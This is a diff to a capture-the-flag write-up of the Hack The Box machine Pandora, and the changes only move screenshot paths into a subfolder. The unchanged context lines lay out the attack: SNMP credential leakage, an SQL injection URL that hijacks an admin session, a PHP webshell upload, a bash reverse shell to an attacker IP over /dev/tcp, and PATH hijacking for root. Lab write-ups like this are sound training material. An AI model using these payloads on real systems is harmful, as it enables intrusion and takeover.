@@ -142,8 +142,8 @@ Results:
 - `/assets/` â†’ Directory listing but nothing useful  
 - `/server-status/` â†’ Forbidden  
 
-![directory_listing_assets](directory_listing_assets.png)  
-![directory_listing_server_status](directory_listing_server_status.png)
+![directory_listing_assets](screenshots/directory_listing_assets.png)  
+![directory_listing_server_status](screenshots/directory_listing_server_status.png)
 
 Blocked here, we pivot to **UDP enumeration**.
 
@@ -156,7 +156,7 @@ Enumerate UDP for services such as **SNMP** that often expose useful strings:
 sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136
 ```
 
-![nmap_udp](nmap_udp.png)
+![nmap_udp](screenshots/nmap_udp.png)
 
 Port `161/udp` open â†’ **SNMP**.
 
@@ -166,13 +166,13 @@ Deep scan:
 sudo nmap -sUCV -p161 10.10.11.136 -oN UDPScan
 ```
 
-![udpscan_analysis](udpscan_analysis.png)
+![udpscan_analysis](screenshots/udpscan_analysis.png)
 
 Interesting findings:
 - UID 835 â†’ User **Debian**
 - UID 1100 â†’ Credentials: `daniel // HotelBabylon23`
 
-![udpscan_credentials](udpscan_credentials.png)
+![udpscan_credentials](screenshots/udpscan_credentials.png)
 
 ---
 ## 3. Foothold
@@ -183,11 +183,11 @@ SSH access with leaked credentials:
 ssh daniel@10.10.11.136
 ```
 
-![ssh_daniel](ssh_daniel.png)
+![ssh_daniel](screenshots/ssh_daniel.png)
 
 We land as **daniel** but user flag belongs to **matt**:
 
-![user_flag_fail](user_flag_fail.png)
+![user_flag_fail](screenshots/user_flag_fail.png)
 
 ### 3.1 Privilege Enumeration
 
@@ -203,8 +203,8 @@ Suspicious binary: `pandora_backup`.
 
 Exploring `/var/www/html/` reveals `pandora_console`:
 
-![pandora_console](pandora_console.png)  
-![pandora_console_info](pandora_console_info.png)
+![pandora_console](screenshots/pandora_console.png)  
+![pandora_console_info](screenshots/pandora_console_info.png)
 
 Configuration file discloses hidden domain: **pandora.panda.htb** (port 80).
 
@@ -214,7 +214,7 @@ Validate via cURL:
 curl localhost
 ```
 
-![pandora_console_curl](pandora_console_curl.png)
+![pandora_console_curl](screenshots/pandora_console_curl.png)
 
 ### 3.2 Local Port Forwarding
 
@@ -232,7 +232,7 @@ ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 
 Now accessible at `127.0.0.1:80`:
 
-![pandora_console_web](pandora_console_web.png)
+![pandora_console_web](screenshots/pandora_console_web.png)
 
 ### 3.3 Pandora Console exploitation
 
@@ -245,11 +245,11 @@ SQLi to hijack admin session:
 include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
 ```
 
-![pandora_console_cookie_admin](pandora_console_cookie_admin.png)
+![pandora_console_cookie_admin](screenshots/pandora_console_cookie_admin.png)
 
 Cookie updated, if we refresh the website,  the admin login is successful:
 
-![pandora_console_login](pandora_console_login.png)
+![pandora_console_login](screenshots/pandora_console_login.png)
 
 ### 3.4 File Upload for RCE
 
@@ -261,15 +261,15 @@ Access File Manager, upload PHP webshell:
 ?>
 ```
 
-![cmd_php](cmd_php.png)
+![cmd_php](screenshots/cmd_php.png)
 
 Uploaded successfully:
 
-![pandora_console_cmd_php](pandora_console_cmd_php.png)
+![pandora_console_cmd_php](screenshots/pandora_console_cmd_php.png)
 
 Execute commands via browser:
 
-![pandora_console_web_console](pandora_console_web_console.png)
+![pandora_console_web_console](screenshots/pandora_console_web_console.png)
 
 Reverse shell setup:
 
@@ -284,7 +284,7 @@ Final payload (URL-encoded):
 http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261"
 ```
 
-![pandora_console_netcat](pandora_console_netcat.png)
+![pandora_console_netcat](screenshots/pandora_console_netcat.png)
 
 âœ… **User flag obtained**  
 ![user_flag](screenshots/user_flag.png)
@@ -300,7 +300,7 @@ Generate SSH keys:
 ssh-keygen
 ```
 
-![ssh_id_rsa](ssh_id_rsa.png)  
+![ssh_id_rsa](screenshots/ssh_id_rsa.png)  
 ![id_rsa](screenshots/id_rsa.png)
 
 Connect as matt:
@@ -320,7 +320,7 @@ Check binary:
 ls -l ./usr/bin/pandora_backup
 ```
 
-![pandora_backup_priv](pandora_backup_priv.png)
+![pandora_backup_priv](screenshots/pandora_backup_priv.png)
 
 Trace execution:
 
@@ -328,7 +328,7 @@ Trace execution:
 ltrace ./usr/bin/pandora_backup
 ```
 
-![pandora_backup_code](pandora_backup_code.png)
+![pandora_backup_code](screenshots/pandora_backup_code.png)
 
 Finds `tar` called with **relative path** â†’ vulnerable to **path hijacking**.
 
@@ -343,8 +343,8 @@ export PATH=/tmp:$PATH
 echo $PATH
 ```
 
-![tar_file](tar_file.png)  
-![path_hijacking](path_hijacking.png)
+![tar_file](screenshots/tar_file.png)  
+![path_hijacking](screenshots/path_hijacking.png)
 
 ðŸ **Root flag obtained**  
 ![root_flag](screenshots/root_flag.png)
